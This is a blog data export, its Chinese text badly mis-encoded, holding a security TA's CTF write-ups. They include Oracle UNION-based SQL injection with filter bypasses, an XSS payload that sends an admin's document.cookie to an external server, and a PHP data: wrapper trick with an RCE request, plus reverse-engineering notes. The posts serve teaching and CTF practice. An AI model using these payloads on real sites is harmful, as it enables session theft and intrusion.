Write-up","slug":"ç¨‹å¼å®‰å…¨-HW4-Write-up","date":"2019-12-17T20:40:22.000Z","updated":"2021-03-22T19:21:37.000Z","comments":true,"path":"tw/ç¨‹å¼å®‰å…¨-HW4-Write-up/","permalink":"http://blog.terrynini.tw/tw/%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-HW4-Write-up/","excerpt":"2019 å¹´äº¤å¤§ç¨‹å¼å®‰å…¨ HW4 write-upå“ˆå“ˆæ˜¯æˆ‘æ‹‰ğŸ˜ğŸ˜ğŸ˜åŠ©æ•™æ‹‰ğŸ¤™ğŸ¤™ğŸ¤™","text":"2019 å¹´äº¤å¤§ç¨‹å¼å®‰å…¨ HW4 write-upå“ˆå“ˆæ˜¯æˆ‘æ‹‰ğŸ˜ğŸ˜ğŸ˜åŠ©æ•™æ‹‰ğŸ¤™ğŸ¤™ğŸ¤™ Cathubv2æœ¬é¡Œçš„æ¼æ´åœ¨å½±ç‰‡çš„é é¢ï¼ˆé»é€²å»ä»»æ„ä¸€æ”¯å½±ç‰‡çš„åœ°æ–¹ï¼‰ï¼Œurl è£¡çš„ vid æœƒè¢«èƒŒå¾Œçš„ OracleDB æŠ“å»æœå°‹ï¼Œæˆ‘å€‘å¯ä»¥çŒœæƒ³åˆ°å½±ç‰‡é€£çµèˆ‡æ¨™é¡Œæ‡‰è©²æ˜¯å¾DBæ’ˆå‡ºä¾†çš„ï¼Œæ‰€ä»¥æˆ‘å€‘å¯èƒ½å¯ä»¥é€é UNION çš„æ–¹å¼ä¾†ç›´æ¥æŠŠè³‡è¨Šå°å‡ºä¾†ï¼Œé€™è£¡å¯ä»¥å…ˆæ¸¬è©¦æœ‰å¹¾å€‹ column : vid=-1 union select 1,null from dual è¦æ³¨æ„çš„æ˜¯ç©ºç™½æœƒè¢«é˜»æ“‹ï¼Œæ‰€ä»¥æˆ‘å€‘è¦æŠŠç©ºç™½ç½®æ›æˆ /**/ æˆ–æ˜¯ %0a ä¾†ç¹éæª¢æŸ¥ï¼ŒåŒæ™‚ä¹Ÿå¯ä»¥ç™¼ç¾ &#39; è·Ÿ chr ä¹Ÿæœƒè¢«æ“‹ä¸‹ä¾†ï¼Œæœ€å¾Œæˆ‘å€‘å¯ä»¥çŸ¥é“ç¸½å…±æœ‰ä¸‰å€‹æ¬„ä½ï¼š vid=-1 union select 1,null,null from dual é€šéæ¸¬è©¦å¯ä»¥çŸ¥é“ï¼Œç¬¬äºŒå€‹æ¬„ä½æ˜¯å½±ç‰‡æ¨™é¡Œï¼Œé€™è£¡æˆ‘å€‘å¯ä»¥å»æ’ˆ oracleDB çš„ metadata ä¾†æ‰¾æœ‰è¶£çš„ table åï¼š vid=-1 union select null,table_name,null from user_tables offset 1 rows fetch first 1 rows onlyvid=-1 union select null,table_name,null from user_tables offset 2 rows fetch first 1 rows onlyvid=-1 union select null,table_name,null from user_tables offset 3 rows fetch first 1 rows only... æœƒç™¼ç¾æ’ˆå‡ºåç‚º S3CRET çš„ tableï¼Œé€™æ™‚æˆ‘å€‘å¯ä»¥å˜—è©¦å»çœ‹ä»–æœ‰ä»€éº¼ columnï¼Œå‰é¢æåˆ° &#39; è¢«æ“‹ä½æ‰€ä»¥ç„¡æ³•ç›´æ¥ä½¿ç”¨ where table_name=&#39;S3CRET&#39;ï¼Œç°¡å–®ä½¿ç”¨ () åšå¦å¤–ä¸€æ¬¡ query å°±å¯ä»¥æ­£å¸¸ä½¿ç”¨ where äº†ï¼š vid=-1 union select null,column_name,null from user_tab_columns where table_name=(select table_name from user_all_tables offset 5 rows fetch first 1 rows only)offset 1 rows fetch first 1 rows only å¯ä»¥æ‰¾åˆ°æœ‰ä¸€å€‹ column å«åš V3RY_S3CRET_C0LUMNï¼Œæ‰€ä»¥ç¾åœ¨åªè¦æŠŠè©² column çš„å€¼éƒ½æ’ˆå‡ºä¾†å°±å¥½äº†ï¼š select V3RY_S3CRET_COLUMN from S3CRET offset 1 rows fetch first 1 rows only... ç„¶å¾Œå°±å¯ä»¥æ‹¿åˆ° flag äº†ã€‚ how2xssç¹éæ–¹å¼åŒé€™å€‹ writeupï¼Œé€™è£¡è¼ƒç‰¹åˆ¥çš„å°±æ˜¯ window.nameï¼Œåœ¨ä¸€å€‹ window è£¡é¢è¼‰å…¥çš„ document äº‹å¯¦ä¸Šæ˜¯å…±ç”¨ä¸€å€‹ window.nameï¼Œæ¯å€‹è¼‰å…¥çš„ document éƒ½å¯ä»¥å»è®€å¯«ä»–ï¼Œæ‰€ä»¥å¦‚æœé¡Œç›®æ²’å° window.name åšéä¿®æ”¹çš„è©±ï¼Œä»–æœƒä½¿ç”¨ä¸Šä¸€å€‹é é¢çš„ window.name ï¼Œé€™æ¨£æˆ‘å€‘å¯ä»¥ä¸ç”¨ç”¨ iframe å»å¤šåšä¸€å€‹ window ï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥åœ¨æˆ‘å€‘çš„ server ä¸Šæ”¾ payload ï¼Œè®“ admin ç›´æ¥é€ è¨ª payload æ‰€åœ¨çš„ç¶²å€ï¼Œè€Œä¸ä¸€å®šè¦ iframe: terrynini.tw&lt;script&gt;window.name=&quot;document.location=&#x27;https://terrynini.tw/&#x27;+document.cookie&quot;;window.location=&quot;https://edu-ctf.kaibro.tw:30678/hackme.php?q=%3CSVG/ONLoAD=eval(n%26%2397;m\\\\u&#123;65&#125;)%3E&quot;;&lt;/script&gt; ç„¶å¾Œç›´æ¥å›å ± terrynini.tw çµ¦ adminï¼Œé€™æ¨£ window.location è·³è½‰ä¹‹å¾Œï¼Œå…¶å¯¦æˆ‘å€‘ window.name é‚„æ˜¯æœƒè¢«ä¿å­˜ï¼Œå¦‚æ­¤é€éæœ¬ä¾†é é¢çš„ xss æ¼æ´ä¾†è§¸ç™¼ svg/onload è£¡çš„ eval å»é€ è¨ªæˆ‘å€‘çš„ serverï¼Œå¦‚æ­¤å¯ä»¥åœ¨è‡ªå·± server ä¸Šçš„ apache access log çœ‹åˆ° admin bot é€ è¨ªäº†ä»€éº¼ uriï¼Œä¹Ÿå°±æ˜¯ document.cookieã€‚ 12&#x2F;25 è£œå……çœ‹äº†å¤§å®¶ç¹³äº¤çš„ writeup å…¶å¯¦ä¸å¤ªç¢ºå®šå¤§å®¶æ˜¯ä¸æ˜¯æœ‰ç†è§£åŸç†â€¦.ï¼Œå› ç‚ºé€™é¡Œè¼ƒæ··äº‚ï¼Œæ‰€ä»¥é€™æ¬¡ä½œæ¥­è©•åˆ†æœ‰è§£é‡‹æ¸…æ¥šçš„äººæœƒå¤šä¸€å€‹ + è™Ÿï¼Œåˆ†æ•¸ä¹‹å¾Œå†è¨è«–ï¼Œç¸½æ‹¬ä¾†èªªæœƒæœ‰å…©ç¨® payload ï¼Œä¸€ç¨®æ˜¯åƒä¸Šè¿° writeup ä¸€æ¨£ä½¿ç”¨ &lt;iframe src=/\\PSHTA.ML&gt; è®“ admin è¨ªå•ï¼Œç¬¬äºŒç¨®æ˜¯ç›´æ¥æŠŠ javascript æ‰€åœ¨çš„ç¶²å€çµ¦ admin å»è¨ªå•ã€‚ä¸»è¦å·®åˆ¥åœ¨æ–¼ï¼Œå¦‚æœå›å ±çµ¦ admin çš„ç¶²å€å¿…é ˆä¹Ÿå¾—æ˜¯ https://edu-ctf.kaibro.tw:30678/hackme.php?q= çš„è©±ï¼Œé‚£æˆ‘å€‘å°±å¿…é ˆä½¿ç”¨ iframe çš„æ–¹å¼ä¸å¯ï¼Œä½†é€™é¡Œå…¶å¯¦æ²’æœ‰é€™å€‹é™åˆ¶ï¼Œæ‰€ä»¥ä¸éœ€è¦å¤šç¹ä¸€å€‹ iframe ä¾†å®Œæˆï¼Œå¯ä»¥ç›´æ¥å‚³ç¶²å€å°±å¥½äº†ã€‚ å› ç‚ºä¸çŸ¥é“å¤§å®¶æ˜¯ä¸æ˜¯æœ‰ç™¼ç¾å¯ä»¥å›å ±å¤–éƒ¨ç¶²åŸŸï¼Œwriteup çš„èªæ„å¯èƒ½æœ‰èª¤æœƒï¼Œæ‰€ä»¥é€™è£¡ä¸ç”¨ A/B ä¾†è©•åˆ†ï¼Œå°±è®“æœ‰è§£é‡‹æ¸…æ¥šçš„äººå¤šé»åˆ†æ•¸é€™æ¨£å­ã€‚ åœ¨å…¶ä»–éƒ¨åˆ†ï¼Œé€™å…©ç¨® payload å…¶å¯¦æ²’æœ‰å·®åˆ¥ï¼Œ iframe è·Ÿç›´æ¥å­˜å–ç¶²å€ä¸€æ¨£ï¼Œéƒ½æœ‰è·¨åŸŸæ‹¿ cookie çš„å•é¡Œï¼Œæ‰€ä»¥æˆ‘å€‘ä¸èƒ½åœ¨ iframe è£¡é¢ç›´æ¥æ‹¿ cookieï¼Œå¿…é ˆæŠŠ admin å°å›åŒç¶²åŸŸ (edu-ctf.kaibro.tw) ä¸­æœ‰ Reflected XSS æ¼æ´çš„é é¢ï¼Œé€™è£¡åˆ©ç”¨ window.name è·¨åŸŸçš„ç‰¹æ€§æ‰€ä»¥å¯ä»¥å¤¾å¸¶æˆ‘å€‘çœŸå¯¦çš„ payload ä¾†ç¹é filterã€‚","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://blog.terrynini.tw/tags/Web/"}]},{"title":"2019::Flare-On 6::Record","slug":"2019-Flare-On-6-Record","date":"2019-12-04T02:05:01.000Z","updated":"2021-02-08T06:37:04.000Z","comments":true,"path":"en/2019-Flare-On-6-Record/","permalink":"http://blog.terrynini.tw/en/2019-Flare-On-6-Record/","excerpt":"Finished all 12 challenges of Flare-On 6, this yearâ€™s challenge seemâ€™s to be more friendly than last year.So itâ€™ my first year to finish all challenges, the second year I play Flare-On.","text":"Finished all 12 challenges of Flare-On 6, this yearâ€™s challenge seemâ€™s to be more friendly than last year.So itâ€™ my first year to finish all challenges, the second year I play Flare-On. Cuz I didnâ€™t write my memo during the contest, itâ€™s a time-consuming task to review them all. So this article is not a write-up, just some images. The challenge 12 take me some time to understand whatâ€™s going on, even baked a cake to calm me down, and yes, that work !I am the 290th to finish all 12 challenges And the badge !","categories":[{"name":"Record","slug":"Record","permalink":"http://blog.terrynini.tw/categories/Record/"}],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://blog.terrynini.tw/tags/Reverse/"},{"name":"Flare-On","slug":"Flare-On","permalink":"http://blog.terrynini.tw/tags/Flare-On/"}]},{"title":"ç¨‹å¼å®‰å…¨::HW3 Write-up","slug":"ç¨‹å¼å®‰å…¨-HW3-Write-up","date":"2019-11-20T16:16:23.000Z","updated":"2021-03-22T19:21:10.000Z","comments":true,"path":"tw/ç¨‹å¼å®‰å…¨-HW3-Write-up/","permalink":"http://blog.terrynini.tw/tw/%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-HW3-Write-up/","excerpt":"2019 å¹´äº¤å¤§ç¨‹å¼å®‰å…¨ HW3 write-upå“ˆå“ˆæ˜¯æˆ‘æ‹‰ğŸ˜ğŸ˜ğŸ˜åŠ©æ•™æ‹‰ğŸ¤™ğŸ¤™ğŸ¤™","text":"2019 å¹´äº¤å¤§ç¨‹å¼å®‰å…¨ HW3 write-upå“ˆå“ˆæ˜¯æˆ‘æ‹‰ğŸ˜ğŸ˜ğŸ˜åŠ©æ•™æ‹‰ğŸ¤™ğŸ¤™ğŸ¤™ Unexploitable [100 point]Reconç°¡å–®æª¢æŸ¥ä¸€ä¸‹ç¶²é åŸå§‹ç¢¼ï¼Œå¯ä»¥ç™¼ç¾ç¶²é å¾ˆç°¡å–®ï¼Œåªæœ‰ Matrix rain ç‰¹æ•ˆçš„ javascript é‚„æœ‰ä¸€å€‹æª¢æŸ¥ konami ç§˜æŠ€çš„ k.jsï¼Œcookie çš„éƒ¨åˆ†ä¹Ÿæ²’æœ‰ä»€éº¼å¥½çœ‹çš„ï¼Œä¾†æª¢æŸ¥ä¸€ä¸‹ header å¯ä»¥ç™¼ç¾è©²ç¶²é å¯èƒ½æ˜¯æ¶åœ¨ github ä¸Šçš„æŸå€‹éœæ…‹ç¶²ç«™ã€‚ $ curl -kI https://unexploitable.kaibro.tw/HTTP/2 200server: GitHub.comcontent-type: text/html; charset=utf-8last-modified: Thu, 17 Oct 2019 10:11:00 GMTetag: &quot;5da83e34-4f2&quot;access-control-allow-origin: *expires: Wed, 20 Nov 2019 17:32:45 GMTcache-control: max-age=600x-proxy-cache: MISSx-github-request-id: C7D4:5C02:1DA1BF:25B879:5DD57664accept-ranges: bytesdate: Wed, 20 Nov 2019 17:22:46 GMTvia: 1.1 varnishage: 0x-served-by: cache-hkg17931-HKGx-cache: MISSx-cache-hits: 0x-timer: S1574270566.811443,VS0,VE228vary: Accept-Encodingx-fastly-request-id: bc1e55a82c40be45132ceda0c55024153b3be9fbcontent-length: 1266 åˆæˆ–è€…æ˜¯åœ¨è¨ªå• url ï¼Œä¾‹å¦‚ https://unexploitable.kaibro.tw/test ï¼Œæ™‚å¯èƒ½æœƒå¾—åˆ°éŒ¯èª¤ï¼š æ„Ÿè¦º github ä¸Šæ‡‰è©²æœ‰è—å¯¶ï¼Œå˜—è©¦å…ˆæ‰¾åˆ° repoï¼Œé€é dig æŒ‡ä»¤æ‰¾åˆ° unexploitable.kaibro.tw. æ˜¯ bucharesti.github.io. çš„ CNAMEï¼š $ dig unexploitable.kaibro.tw; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; unexploitable.kaibro.tw;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 36406;; flags: qr rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 8, ADDITIONAL: 13;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 4096;; QUESTION SECTION:;unexploitable.kaibro.tw. IN A;; ANSWER SECTION:unexploitable.kaibro.tw. 3078 IN CNAME bucharesti.github.io.bucharesti.github.io. 3078 IN A 185.199.109.153bucharesti.github.io. 3078 IN A 185.199.110.153bucharesti.github.io. 3078 IN A 185.199.111.153bucharesti.github.io. 3078 IN A 185.199.108.153 æ‰¾åˆ° repo å¾Œå¯ä»¥ç™¼ç¾ç›®å‰çš„ç‰ˆæœ¬æ˜¯æ²’æœ‰ flag çš„ï¼ŒæŸ¥çœ‹ commit ç´€éŒ„å¯ä»¥ç™¼ç¾æœ‰æ¢ commit message æ˜¯ delete secret file: å¯ä»¥åœ¨è£¡é¢æ‰¾åˆ° flag : FLAG&#123;baby_recon_dont_forget_to_look_github_page&#125; Safe R&#x2F;W [200 point]Reconé¦–å…ˆé–±è®€ä¸€ä¸‹ source codeï¼Œå¯ä»¥çŸ¥é“æµç¨‹å¤§æ¦‚æ˜¯ï¼š æ ¹æ“šä½¿ç”¨è€…æŒ‡ç´‹å»ºç«‹ä¸€å€‹ sandbox å¯æŒ‡å®šè¦å»ºç«‹çš„è³‡æ–™å¤¾åç¨± $fï¼Œwaf æª¢æŸ¥ä¸åŒ…å« . / - ä»»ä¸€å­—å…ƒ å¯æŒ‡å®šè¦è¢« include çš„æª”æ¡ˆåç¨± $iï¼Œwaf æª¢æŸ¥ä¸åŒ…å« ph å­—ä¸² å¯æŒ‡å®šè¦å¾€æª”æ¡ˆ meow å¯«å…¥çš„å…§å®¹ $cï¼Œwaf æª¢æŸ¥é•·åº¦ä¸è¶…é 20 bytes åˆªé™¤è³‡æ–™å¤¾ ç”±æ–¼ 5. æœƒåˆªé™¤è³‡æ–™å¤¾ï¼Œæ‰€ä»¥æˆ‘å€‘å¿…é ˆè¦åœ¨ @include($i); çš„æ™‚å€™å°±è®“ä»–åŸ·è¡Œ php ç¨‹å¼ç¢¼ï¼Œæˆ–è€…æ˜¯ç›´æ¥æŠŠ flag include é€²ä¾†ï¼Œä½†æ˜¯ä½œæ¥­æœ‰èªª open_basedir=/var/www/html/ å¯ä»¥ç›´æ¥å‡è¨­ flag åœ¨é€™å€‹è³‡æ–™å¤¾ä¹‹å¤–ï¼Œæ‰€ä»¥å…ˆä¸è€ƒæ…®ç¬¬äºŒæ¢è·¯ã€‚ åˆ°é€™è£¡å¯ä»¥ç™¼ç¾æˆ‘å€‘é¦–å…ˆè¦è§£æ±ºçš„é›£é»æ˜¯å¦‚ä½•é€šéé€™å€‹æª¢æŸ¥ï¼Œè®“æˆ‘å€‘å¯ä»¥æŠŠ &lt;?php å¡é€²å»æˆ‘å€‘è¦ include çš„æª”æ¡ˆä¾† RCEï¼š stripos(file_get_contents($i), &#x27;&lt;&#x27;) === FALSE Exploité¦–å…ˆæˆ‘æœ‰å€‹å¤§è†½çš„æƒ³æ³•ï¼Œç¬¬ä¸€è¡Œæ¸¬ä¸åˆ° &#39;&lt;?php&#39;ï¼Œç¬¬å››è¡Œåˆè·‘å‡º &#39;&lt;?php&#39; ä¸å°±æ´—æ´—ç¡äº†å— if(isset($i) &amp;&amp; stripos(file_get_contents($i), &#x27;&lt;&#x27;) === FALSE) &#123; echo &quot;&lt;div class=&#x27;container&#x27;&gt;&quot;; echo &quot;&lt;h2&gt;Here is your file content:&lt;/h2&gt;&quot;; @include($i); echo &quot;&lt;/div&gt;&quot;;&#125; çœ‹åˆ° file_get_contents æ‡‰è©²æœƒæƒ³åˆ°å„ç¨® protocols è·Ÿ wrappersï¼Œæ¥ä¸‹ä¾†å¯ä»¥é€é php -a æ‰“é–‹ php çš„ interactive shell åšç°¡å–®çš„æ¸¬è©¦ï¼Œphp åœ¨ defualt çš„æƒ…æ³ä¸‹å°æ–¼é–‹æª”é‚„æœ‰ include çš„è¨­ç½®å¦‚ä¸‹ï¼š phpinfo();...allow_url_fopen =&gt; On =&gt; Onallow_url_include =&gt; Off =&gt; Off ä¸€å€‹æœ‰é–‹ä¸€å€‹æ²’é–‹ï¼Œä¹Ÿå°±æ˜¯èªªæˆ‘å€‘å¯èƒ½å¯ä»¥é€é protocols&#x2F;wrapper ä¾†è®“æª¢æŸ¥çš„å…§å®¹èˆ‡å¯¦éš›ä¸Šè¢«å‘ˆç¾çš„å…§å®¹ç”¢ç”Ÿä¸ä¸€è‡´ï¼Œé€™è£¡å¯ä»¥æšèˆ‰å„ç¨®æ”¯æ´çš„ protocols&#x2F;wrapperï¼Œç„¶å¾Œæ—¢ç„¶éƒ½çµ¦ source code äº†ï¼Œç›´æ¥æ•´ä»½æ‹¿ä¸‹ä¾†æ¶èµ·ä¾† debug æœ€å¿«ï¼Œé€™è£¡é †æ‰‹æ‰“é–‹ error messageï¼š ini_set(&#x27;display_errors&#x27;,&#x27;1&#x27;);error_reporting(E_ALL); å‡è¨­é‡åˆ°ä¸æ”¯æ´ï¼ˆåŒ…æ‹¬æœªé–‹å•Ÿï¼‰ï¼Œé è¨­æœƒä½¿ç”¨ file:// ä¹Ÿå°±æ˜¯ç›´æ¥ç•¶æª”æ¡ˆè®€ï¼Œæ‰€ä»¥å¯ä»¥é€éä¸‹åˆ—æ–¹å¼ä¾†æ¸¬è©¦æ˜¯å¦å¯ä»¥åˆ©ç”¨ï¼š å¤§éƒ¨åˆ†çš„ protocols&#x2F;wrapper éƒ½éœ€è¦åœ¨ config php çš„æ™‚å€™é–‹å•Ÿï¼ŒåŸºæœ¬ä¸Šä¸æœŸå¾…é ç«¯æœ‰æ‰“é–‹ï¼Œè©¦ä¸‹å»æ„Ÿè¦ºä¹Ÿæ˜¯æ²’æœ‰ï¼Œæœ¬ä¾†çŒœæƒ³ç°¡å–®çš„ http: è·Ÿ http:///meow æ‡‰è©²å¯ä»¥é¨™é file_get_contents å»æ‹¿å–å¤–éƒ¨è³‡æºï¼Œç„¶å¾Œåœ¨ include æ™‚è¢«ç•¶ä½œè·¯å¾‘ï¼Œä½†æœƒç™¼ç¾é›–ç„¶ include æ²’å•Ÿç”¨ url ä½†æ˜¯é‡åˆ° data:// è·Ÿ http:// é‚„æ˜¯æœƒåéŒ¯èª¤çµ¦ä½ ï¼Œå¯ä»¥ç™¼ç¾æˆ‘å€‘çš„è¼¸å…¥ä¸æœƒè¢«ç•¶ä½œè·¯å¾‘ï¼Œåè€Œæœƒæ˜¯èªªé€™å€‹ protocol ä¸å…è¨±ç„¶å¾Œç›´æ¥çˆ›æ‰ Warning: include(): data:// wrapper is disabled in the server configuration by allow_url_include=0 in /var/www/html/asdfasdfasdfasdf.php on line 46Warning: include(data://meow): failed to open stream: no suitable wrapper could be found in /var/www/html/asdfasdfasdfasdf.php on line 46Warning: include(): Failed opening &#x27;data://meow&#x27; for inclusion (include_path=&#x27;.:/usr/share/php&#x27;) in /var/www/html/asdfasdfasdfasdf.php on line 46 è©¦åˆ° data:// çš„æ™‚å€™å¯ä»¥çœ‹åˆ°ä¸‹é¢æœ‰å€‹äººåœ¨ 11 å¹´å‰å‘Šè¨´ä½  data: ä¹Ÿæ˜¯æ”¯æ´çš„ï¼Œåœ¨ local æ¸¬ä¸€ä¸‹ data:è·Ÿ data:/meow çš„çµ„åˆï¼š Warning: file_get_contents(data:/meow): failed to open stream: rfc2397: no comma in URL in /var/www/html/asdfasdfasdfasdf.php on line 41 ç™¼ç¾ä»–æœƒåœ¨ file_get_contents æ™‚åƒ warning ä½†æ˜¯ includeå»æ²’å™´æ±è¥¿å‡ºä¾†ï¼ï¼æ‰€ä»¥é€™è£¡å¯ä»¥é€éæœ‰æ®˜ç¼ºçš„ data: å½¢å¼è®“ file_get_contents æ‰“ä¸é–‹æª”æ¡ˆå°è‡´å›å‚³ false å¾è€Œé€šéåˆ¤æ–·ï¼š php &gt; $i = &quot;zzz&quot;;php &gt; var_dump(file_get_contents($i));Warning: file_get_contents(zzz): failed to open stream: No such file or directory in php shell code on line 1bool(false)php &gt; var_dump(stripos(file_get_contents($i), &#x27;&lt;&#x27;));Warning: file_get_contents(zzz): failed to open stream: No such file or directory in php shell code on line 1bool(false) ç•¶ç„¶ä½ ä¹Ÿå¯ä»¥é¸æ“‡é€éæ­£å¸¸çš„çµ„åˆä¾†é€šéåˆ¤æ–· data:, è·Ÿ data:,/meow (data:,/meow å°±æ˜¯ plain text çš„ /meow)ï¼š php &gt; $i = &quot;data:,/meow&quot;;php &gt; var_dump(file_get_contents($i));string(5) &quot;/meow&quot;php &gt; var_dump(stripos(file_get_contents($i), &#x27;&lt;&#x27;) );bool(false) åˆ°é€™è£¡æˆ‘å€‘å°±å¯ä»¥ RCE äº†ï¼š ç•¶ç„¶å¯ä»¥ç”¨ 20 byte çš„ payload å°±æŠŠ flag çŒœå‡ºä¾†ä½†é‚„æ˜¯æœ‰é»ä¸è‡ªç”±ï¼Œæœ‰ç‰†å°±è¦çˆ¬ä¸€ä¸‹ï¼Œé€™é‚Šæ‹¿ä¸Šèª²æ•™çš„æ±è¥¿éš¨ä¾¿æˆ³å€‹: php &gt; $c = array(&#x27;ls&#x27;,&#x27; -la &#x27;,&#x27; ../../../&#x27;);php &gt; var_dump(strlen($c) &gt; 20);bool(false)php &gt; file_put_contents(&quot;meow&quot;, $c);php &gt; echo file_get_contents(&quot;meow&quot;);ls -la ../../../ ç„¶å¾Œä½ å°±å¯ä»¥æ„›æ€éº¼æ‰“æ€éº¼æ‰“ï¼š https://edu-ctf.csie.org:10155/?f=data%3A&amp;i=data%3A%2Fmeow&amp;c[]=%3C%3Fphp+echo+%60cat+../../../../../../../../../../../../../../../../../../flag_is_here%60%3B flag: FLAG&#123;w3lc0me_t0_th3_PHP_W0r1d&#125; Other Solutionå‰é¢æåˆ°çš„ä¸»è¦æ€è·¯å°±æ˜¯ï¼š æˆ‘æœ‰å€‹å¤§è†½çš„æƒ³æ³•ï¼Œç¬¬ä¸€è¡Œæ¸¬ä¸åˆ° &#39;&lt;?php&#39;ï¼Œç¬¬å››è¡Œåˆè·‘å‡º &#39;&lt;?php&#39; é€™å¯ä»¥é€é race condition ä¾†é”æˆï¼Œå› ç‚ºä¸€å››è¡Œé–“è®€å–çš„æ™‚é–“å·®ï¼Œé‚„æœ‰æ ¹æ“šç›¸åŒçš„ ip ï¼Œ useragent æˆ‘å€‘æœƒä¸€ç›´å­˜å–åˆ°åŒä¸€å€‹è³‡æ–™å¤¾ï¼Œé€éå¤šå€‹ client æˆ‘å€‘å¯ä»¥æ’åˆ°å¹¾æ¬¡ä»–æª¢æŸ¥å®Œæˆ‘å€‘åˆæŠŠå…§å®¹æ”¹æ‰ï¼Œè®“å·²ç¶“é€šéæª¢æŸ¥çš„ server å» include æˆ‘å€‘ä¿®æ”¹éçš„ meowã€‚","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://blog.terrynini.tw/tags/Web/"}]},{"title":"TIL::Windows Services Debug","slug":"TIL-Windows-Services-Debug","date":"2019-07-01T05:40:06.000Z","updated":"2019-07-27T10:22:31.000Z","comments":true,"path":"tw/TIL-Windows-Services-Debug/","permalink":"http://blog.terrynini.tw/tw/TIL-Windows-Services-Debug/","excerpt":"trace äº†ä¸€éš»å¾ˆ G8 çš„ç¨‹å¼ï¼Œé †æ‰‹è¨˜éŒ„ä¸€ä¸‹åœ¨ windows ä¸‹ï¼Œæ€éº¼ attach åˆ°ä¸€éš»æœå‹™ä¸Šé¢å‹•æ…‹ debugã€‚","text":"trace äº†ä¸€éš»å¾ˆ G8 çš„ç¨‹å¼ï¼Œé †æ‰‹è¨˜éŒ„ä¸€ä¸‹åœ¨ windows ä¸‹ï¼Œæ€éº¼ attach åˆ°ä¸€éš»æœå‹™ä¸Šé¢å‹•æ…‹ debugã€‚ åœ¨ windows ä¸‹å¯ä»¥åœ¨ HKLM\\SYSTEM\\CurrentControlSet\\Services è¨»å†Šæœå‹™ï¼Œä¹‹å¾Œå¯ä»¥ä½¿ç”¨æŒ‡ä»¤ net start ServiceName ä¾†å•Ÿå‹•è©²æœå‹™ã€‚Microsoft å®˜æ–¹ä»‹ç´¹äº†å¾ˆå¤š Debug æ–¹æ³•ï¼Œä½†æ˜¯åœ¨ Vista çš„ç‰ˆæœ¬ä¹‹å¾Œï¼Œå› ç‚ºæœå‹™éƒ½è¢«æ”¾é€² session0ï¼Œæ‰€ä»¥ Debug åŸºæœ¬ä¸Šåªèƒ½é€é remote æˆ–æ˜¯ kernel æ§åˆ¶çš„ usermode debuggerã€‚ å®‰è£ Windows å®˜æ–¹ SDK çš„ debug tool å¾Œï¼Œé€é Global flag ä¾†ç¶å®šç¨‹å¼å•Ÿå‹•æ™‚è‡ªå‹• attach çš„ Debugger ï¼Œè¨­å®šæˆ cdb è®“ service æ›è‘—ï¼Œå°±å¯ä»¥å¾ WinDbg remote debug è©²æœå‹™ã€‚ æœ‰äº›æœå‹™æ˜¯æŠŠ ImagePath è¨­å®šæˆ %SYSTEMROOT%\\System32\\svchost.exe -k netsvcs -p ï¼Œé€é svchost è¼‰å…¥ ServiceDll ä¾†å•Ÿå‹•æœå‹™ï¼Œé€™æ™‚å€™æˆ‘å€‘ attach åˆ°çš„æœƒæ˜¯ svchost.exeï¼Œè¦æ‰¾åˆ°æ­£ç¢ºçš„å…¥å£é»å¯ä»¥å…ˆåœ¨ dll è¢«è¼‰å…¥æ™‚ä¸­æ–·ï¼š sxe ld nameofdll.dll åŒæ™‚å› ç‚º dll ä¸€å®šæœ‰ Export ä¸€å€‹ ServiceMain çš„ Entry çµ¦ svchost ä¾†åŸ·è¡Œï¼Œæ‰€ä»¥å¯ä»¥åœ¨ Entry ä¸Šé¢ä¸‹æ–·é»ï¼Œå°±å¯ä»¥é‡é ­é–‹å§‹ traceï¼š bm /a nameofdll!* å¿…è®€è³‡æºï¼š WinDbg Commands Debugging Malware with WinDbg Debugging Windows Services","categories":[{"name":"TodayILearn","slug":"TodayILearn","permalink":"http://blog.terrynini.tw/categories/TodayILearn/"}],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://blog.terrynini.tw/tags/Reverse/"},{"name":"Windows","slug":"Windows","permalink":"http://blog.terrynini.tw/tags/Windows/"}]},{"title":"2019::AIS3::å‰æ¸¬å®˜æ–¹è§£","slug":"2019-AIS3-å‰æ¸¬å®˜æ–¹è§£","date":"2019-06-15T17:04:28.000Z","updated":"2020-12-05T08:57:16.000Z","comments":true,"path":"tw/2019-AIS3-å‰æ¸¬å®˜æ–¹è§£/","permalink":"http://blog.terrynini.tw/tw/2019-AIS3-%E5%89%8D%E6%B8%AC%E5%AE%98%E6%96%B9%E8%A7%A3/","excerpt":"2019 AIS3 pre-exam ç”±æˆ‘å‡ºé¡Œçš„éƒ¨åˆ†çš„è§£é¡Œæµç¨‹ã€‚é¡Œç›®çš„åŸå§‹ç¢¼ä»¥åŠä¸‹é¢æåˆ°çš„è§£æ³•è…³æœ¬é€™è£¡æ˜¯è§£é¡Œçµ±è¨ˆï¼Œçµ¦å¤§å®¶åšå€‹åƒè€ƒã€‚","text":"2019 AIS3 pre-exam ç”±æˆ‘å‡ºé¡Œçš„éƒ¨åˆ†çš„è§£é¡Œæµç¨‹ã€‚é¡Œç›®çš„åŸå§‹ç¢¼ä»¥åŠä¸‹é¢æåˆ°çš„è§£æ³•è…³æœ¬é€™è£¡æ˜¯è§£é¡Œçµ±è¨ˆï¼Œçµ¦å¤§å®¶åšå€‹åƒè€ƒã€‚ WTFé€™é¡Œå…¶å¯¦æ²’æœ‰æ‰“ç®—è¦è€ƒä»€éº¼ï¼Œå°±æ˜¯æ¸¬è©¦ä¸€ä¸‹å¤§å®¶çš„ç¥é€šåŠ›ï¼Ÿé¡Œç›®çµ¦äº†ä¸€æ¨ pngï¼Œç°¡å–®åœ°ç”¨å„ç¨®å·¥å…·æ‡‰è©²æ˜¯æ¸¬ä¸å‡ºä»€éº¼ stego 